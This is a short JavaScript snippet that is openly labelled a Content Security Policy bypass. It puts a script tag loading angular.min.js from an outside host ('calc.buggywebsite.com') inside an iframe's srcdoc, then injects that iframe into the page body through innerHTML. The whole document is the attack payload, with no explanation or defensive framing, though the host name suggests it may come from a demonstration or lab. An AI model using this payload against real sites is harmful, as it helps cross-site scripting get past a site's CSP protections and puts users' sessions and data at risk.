let jsLocation = "http://calc.buggywebsite.com/angular.min.js";
let cspBypass = `<script src="${jsLocation}"></script>`;

let iframe = document.createElement("iframe");
iframe.srcdoc = cspBypass;
let framedCspBypass = iframe.outerHTML;

document.body.innerHTML=framedCspBypass;
